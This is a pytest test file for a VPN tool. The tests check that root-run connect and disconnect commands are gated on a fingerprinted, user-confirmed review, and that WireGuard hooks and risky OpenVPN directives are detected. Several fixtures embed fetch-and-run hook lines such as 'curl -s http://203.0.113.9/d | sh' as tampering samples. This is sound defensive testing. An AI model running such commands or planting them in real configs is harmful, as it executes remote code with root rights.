"""Audit tier-2, step S1: the confirmed review is what root runs.

The review the user confirmed travels to the worker; ``execute`` re-reviews and
aborts, with no administrator prompt, on any difference. Nothing here runs
wg-quick, openvpn, sudo or osascript; the runner is always a recorder.
"""

from __future__ import annotations

import hashlib
import os
import stat
import types

import pytest

from services import vpn_connection, vpn_execution

PRIVATE_KEY = "cHJpdmF0ZS1rZXktdGhhdC1tdXN0LW5ldmVyLWxlYWsxMjM0NTY3OA=="


class Recorder:
    def __init__(self, ok=True, output="ok"):
        self.ok, self.output, self.scripts = ok, output, []

    def __call__(self, script, prompt, timeout=30):
        self.scripts.append(script)
        return self.ok, self.output


class Probe(dict):
    def __init__(self, up=()):
        self.up = set(up)
        super().__init__(
            wireguard=lambda name: {"up": name in self.up, "device": "utun7" if name in self.up else None},
            openvpn_running=lambda: False,
            route_interface=lambda: None,
        )


@pytest.fixture(autouse=True)
def tools_installed(monkeypatch):
    monkeypatch.setattr(vpn_connection.wireguard_manager, "is_wg_quick_available", lambda: True)
    monkeypatch.setattr(vpn_execution.openvpn_manager, "is_openvpn_available", lambda: True)
    real_which = vpn_connection.shutil.which
    monkeypatch.setattr(vpn_connection.shutil, "which",
                        lambda name, *a, **k: None if name == "wg-quick" else real_which(name, *a, **k))


def wg_conf(tmp_path, name="wgnl", interface_extra="", mode=0o600):
    path = tmp_path / f"{name}.conf"
    path.write_text(
        "[Interface]\n"
        f"PrivateKey = {PRIVATE_KEY}\nAddress = 10.8.0.2/32\n{interface_extra}"
        "[Peer]\nPublicKey = c2VydmVyLXB1YmxpYy1rZXk=\n"
        "Endpoint = 203.0.113.7:51820\nAllowedIPs = 0.0.0.0/0\n", encoding="utf-8")
    os.chmod(path, mode)
    return path


def ovpn(tmp_path, body, name="home"):
    path = tmp_path / f"{name}.ovpn"
    path.write_text("client\nremote 203.0.113.7 1194\n" + body, encoding="utf-8")
    return path


def profile_for(path):
    return vpn_connection.profile_from_config(str(path))


def review(action, profile, probe=None):
    return vpn_execution.review_execution(action, profile, probe=probe or Probe(),
                                          killswitch_armed=lambda: False)


def run(action, profile, runner, confirmed, probe=None):
    return vpn_execution.execute(action, profile, confirmed=confirmed, run_as_root=runner,
                                 probe=probe or Probe(), killswitch_armed=lambda: False,
                                 sleep=lambda s: None)


# ── the fingerprint ─────────────────────────────────────────────────────────

def test_the_review_carries_the_sha256_of_the_exact_config_bytes(tmp_path):
    path = wg_conf(tmp_path)
    r = review("connect", profile_for(path))
    assert r.config_sha256 == hashlib.sha256(path.read_bytes()).hexdigest()


def test_an_identical_config_gives_an_identical_fingerprint(tmp_path):
    p = profile_for(wg_conf(tmp_path))
    assert review("connect", p).fingerprint() == review("connect", p).fingerprint()


def test_the_fingerprint_ignores_warnings_but_not_the_things_root_runs(tmp_path):
    import dataclasses
    r = review("connect", profile_for(wg_conf(tmp_path)))
    assert dataclasses.replace(r, warnings=("other",)).fingerprint() == r.fingerprint()
    for change in ({"action": "disconnect"}, {"protocol": "OpenVPN"}, {"target": "/x.conf"},
                   {"command": r.command + " --evil"}, {"interface": "wgx"},
                   {"root_hooks": ("PostUp: id",)}, {"config_sha256": "0" * 64}):
        assert dataclasses.replace(r, **change).fingerprint() != r.fingerprint(), change


def test_a_hook_added_after_confirmation_changes_the_fingerprint(tmp_path):
    path = wg_conf(tmp_path)
    p = profile_for(path)
    before = review("connect", p)
    path.write_text(path.read_text().replace("Address", "PostUp = id\nAddress"))
    assert review("connect", p).fingerprint() != before.fingerprint()


def test_a_changed_comment_changes_the_hash_and_so_the_fingerprint(tmp_path):
    path = wg_conf(tmp_path)
    p = profile_for(path)
    before = review("connect", p)
    path.write_text(path.read_text() + "# touched\n")
    assert review("connect", p).fingerprint() != before.fingerprint()


# ── execute() is gated on the confirmed review ──────────────────────────────

def test_execute_runs_when_the_confirmed_review_still_matches(tmp_path):
    p = profile_for(wg_conf(tmp_path))
    runner = Recorder()
    outcome = run("connect", p, runner, review("connect", p))
    assert outcome.ran is True and len(runner.scripts) == 1


def test_execute_without_a_confirmed_review_fails_closed(tmp_path):
    p = profile_for(wg_conf(tmp_path))
    runner = Recorder()
    outcome = run("connect", p, runner, None)
    assert outcome.ran is False and runner.scripts == []
    assert "no administrator access was requested" in outcome.sections()[0][1]
    assert outcome.status_line.startswith("Refused")


def test_execute_aborts_with_no_prompt_when_the_config_changed_after_confirmation(tmp_path):
    path = wg_conf(tmp_path)
    p = profile_for(path)
    confirmed = review("connect", p)
    path.write_text(path.read_text().replace("Address", "PostUp = curl evil | sh\nAddress"))
    runner = Recorder()
    outcome = run("connect", p, runner, confirmed)
    assert outcome.ran is False and runner.scripts == []
    assert "changed since you confirmed" in outcome.error
    assert "Review again" in outcome.status_line


def test_execute_aborts_when_the_target_changed(tmp_path):
    first, second = wg_conf(tmp_path, "wgone"), wg_conf(tmp_path, "wgtwo")
    confirmed = review("connect", profile_for(first))
    runner = Recorder()
    outcome = run("connect", profile_for(second), runner, confirmed)
    assert outcome.ran is False and runner.scripts == []


def test_execute_aborts_when_the_confirmed_action_differs(tmp_path):
    p = profile_for(wg_conf(tmp_path))
    runner = Recorder()
    outcome = run("connect", p, runner, review("disconnect", p, Probe(up={"wgnl"})))
    assert outcome.ran is False and runner.scripts == []


def test_a_blocked_review_still_reports_its_own_blockers(tmp_path):
    runner = Recorder()
    outcome = run("connect", {"name": "Ex", "protocol": "WireGuard", "endpoint": "<SERVER_IP>",
                              "interface": "wgjp", "placeholder": True}, runner, None)
    assert outcome.ran is False and "template" in outcome.error.lower()


# ── hooks: full text, disconnect scan ───────────────────────────────────────

def test_disconnect_review_scans_predown_and_postdown(tmp_path):
    """Inverse of the old test_disconnect_review_does_not_rescan_hooks."""
    path = wg_conf(tmp_path, "wgh", interface_extra="PostUp = /opt/hook.sh\n"
                   "PreDown = curl -s http://203.0.113.9/d | sh\nPostDown = id\n")
    r = review("disconnect", profile_for(path), Probe(up={"wgh"}))
    assert r.root_hooks == ("PostUp: /opt/hook.sh",
                            "PreDown: curl -s http://203.0.113.9/d | sh",
                            "PostDown: id")
    assert r.config_sha256 == hashlib.sha256(path.read_bytes()).hexdigest()


def test_a_long_hook_is_kept_whole_in_the_model_and_the_detail(tmp_path):
    command = "curl -s http://203.0.113.9/" + "a" * 500 + " | sh"
    path = wg_conf(tmp_path, interface_extra=f"PostUp = {command}\n")
    r = review("connect", profile_for(path))
    assert r.root_hooks == (f"PostUp: {command}",)
    assert command not in r.confirmation_text()          # the dialog body is shortened...
    assert "more characters" in r.confirmation_text()    # ...and says so
    assert command in r.confirmation_detail()            # ...but the detail has all of it
    assert any(command in body for _, body, _ in r.sections())


def test_a_short_hook_is_shown_in_full_in_the_confirmation(tmp_path):
    path = wg_conf(tmp_path, interface_extra="PostUp = echo hi\n")
    r = review("connect", profile_for(path))
    assert "echo hi" in r.confirmation_text()
    assert "more characters" not in r.confirmation_text()


def test_a_hook_line_over_4000_characters_is_a_blocker(tmp_path):
    path = wg_conf(tmp_path, interface_extra="PostUp = echo " + "x" * 4000 + "\n")
    r = review("connect", profile_for(path))
    assert not r.allowed and any("4000" in b for b in r.blockers)


# ── user-writable hook executables (D1) ─────────────────────────────────────

def _fake_stat(table):
    def stat_(path, *a, **k):
        entry = table.get(str(path))
        if entry is None:
            raise FileNotFoundError(path)
        uid, mode = entry
        return types.SimpleNamespace(st_uid=uid, st_mode=mode)
    return stat_


ROOT_DIR = stat.S_IFDIR | 0o755
ROOT_FILE = stat.S_IFREG | 0o755


def test_a_hook_script_owned_by_the_user_is_a_blocker(tmp_path):
    script = tmp_path / "hook.sh"
    script.write_text("#!/bin/sh\n")
    path = wg_conf(tmp_path, interface_extra=f"PostUp = {script} up\n")
    r = review("connect", profile_for(path))
    assert not r.allowed
    assert any(str(script) in b and "administrator" in b for b in r.blockers)


def test_a_group_writable_hook_script_is_a_blocker(monkeypatch, tmp_path):
    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
        "/usr/local/sbin/hook.sh": (0, stat.S_IFREG | 0o775),
        "/usr/local/sbin": (0, ROOT_DIR), "/usr/local": (0, ROOT_DIR),
        "/usr": (0, ROOT_DIR), "/": (0, ROOT_DIR)}))
    path = wg_conf(tmp_path, interface_extra="PostUp = /usr/local/sbin/hook.sh\n")
    assert not review("connect", profile_for(path)).allowed


def test_a_writable_parent_directory_is_a_blocker(monkeypatch, tmp_path):
    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
        "/opt/tools/hook.sh": (0, ROOT_FILE),
        "/opt/tools": (501, stat.S_IFDIR | 0o755), "/opt": (0, ROOT_DIR), "/": (0, ROOT_DIR)}))
    path = wg_conf(tmp_path, interface_extra="PostUp = /opt/tools/hook.sh\n")
    assert not review("connect", profile_for(path)).allowed


def test_a_root_owned_hook_script_is_allowed(monkeypatch, tmp_path):
    monkeypatch.setattr(vpn_execution, "_stat", _fake_stat({
        "/usr/local/sbin/hook.sh": (0, ROOT_FILE),
        "/usr/local/sbin": (0, ROOT_DIR), "/usr/local": (0, ROOT_DIR),
        "/usr": (0, ROOT_DIR), "/": (0, ROOT_DIR)}))
    path = wg_conf(tmp_path, interface_extra="PostUp = /usr/local/sbin/hook.sh up\n")
    r = review("connect", profile_for(path))
    assert r.allowed and r.root_hooks == ("PostUp: /usr/local/sbin/hook.sh up",)


def test_an_inline_shell_hook_is_not_an_executable_path_check(tmp_path):
    path = wg_conf(tmp_path, interface_extra="PostUp = iptables -A FORWARD -j ACCEPT\n")
    assert review("connect", profile_for(path)).allowed      # protected by the config hash


def test_an_openvpn_up_script_in_a_user_directory_is_a_blocker(tmp_path):
    script = tmp_path / "up.sh"
    script.write_text("#!/bin/sh\n")
    r = review("connect", profile_for(ovpn(tmp_path, f"script-security 2\nup {script}\n")))
    assert not r.allowed and any(str(script) in b for b in r.blockers)


# ── OpenVPN blockers and warnings (D3, D4) ──────────────────────────────────

@pytest.mark.parametrize("line", [
    "config other.ovpn", "management 127.0.0.1 7505", "management-client", "log /tmp/x",
    "log-append /tmp/x", "writepid /tmp/pid", "status /tmp/s", "tmp-dir /tmp", "cd /tmp",
    "chroot /tmp", "setenv FOO bar", "--config other.ovpn", "CONFIG other.ovpn",
])
def test_openvpn_directives_that_hide_or_redirect_are_blockers(tmp_path, line):
    r = review("connect", profile_for(ovpn(tmp_path, line + "\n")))
    assert not r.allowed
    assert any(line.split()[0].lstrip("-").lower() in b.lower() for b in r.blockers)


def test_setenv_safe_is_not_setenv(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, "setenv-safe FOO bar\n")))
    assert r.allowed


def test_unknown_openvpn_directives_only_warn_in_one_line(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, "frobnicate 1\nwidget on\ncipher AES-256-GCM\n")))
    assert r.allowed
    unknown = [w for w in r.warnings if "not on the reviewed list" in w]
    assert len(unknown) == 1 and "frobnicate" in unknown[0] and "widget" in unknown[0]
    assert "cipher" not in unknown[0]


def test_a_plain_openvpn_profile_has_no_unknown_warning(tmp_path):
    body = ("dev tun\nproto udp\nnobind\npersist-key\nremote-cert-tls server\n"
            "<ca>\nMIIBogus\nconfig inside block is data\n</ca>\n<key>\nabc\n</key>\n")
    r = review("connect", profile_for(ovpn(tmp_path, body)))
    assert r.allowed and not any("reviewed list" in w for w in r.warnings)


def test_openvpn_connect_review_hashes_the_config(tmp_path):
    path = ovpn(tmp_path, "dev tun\n")
    assert review("connect", profile_for(path)).config_sha256 == hashlib.sha256(path.read_bytes()).hexdigest()


# ── reading the config once ─────────────────────────────────────────────────

def test_an_oversized_config_is_a_blocker(tmp_path):
    path = wg_conf(tmp_path)
    path.write_text(path.read_text() + "# " + "x" * (256 * 1024) + "\n")
    r = review("connect", profile_for(path))
    assert not r.allowed and any("256 KiB" in b for b in r.blockers)


def test_a_symlinked_config_is_a_warning(tmp_path):
    real = wg_conf(tmp_path, "wgreal")
    link = tmp_path / "wglink.conf"
    link.symlink_to(real)
    r = review("connect", profile_for(link))
    assert any("symbolic link" in w for w in r.warnings)


# ── the worker and the panel hand the confirmed review through ──────────────

def test_the_worker_passes_the_confirmed_review_to_execute(monkeypatch):
    from ui import workers
    seen = {}

    def fake_execute(action, profile, **kwargs):
        seen.update(action=action, kwargs=kwargs)
        return types.SimpleNamespace(as_result=lambda: {"success": True})

    monkeypatch.setattr(vpn_execution, "execute", fake_execute)
    sentinel = object()
    worker = workers.VpnConnectionWorker("connect", {"name": "x"}, sentinel)
    got = []
    worker.finished_signal.connect(got.append)
    worker.run()
    assert seen["kwargs"]["confirmed"] is sentinel and got == [{"success": True}]


def test_the_worker_defaults_to_no_confirmed_review(monkeypatch):
    from ui import workers
    assert workers.VpnConnectionWorker("connect", {})._confirmed is None
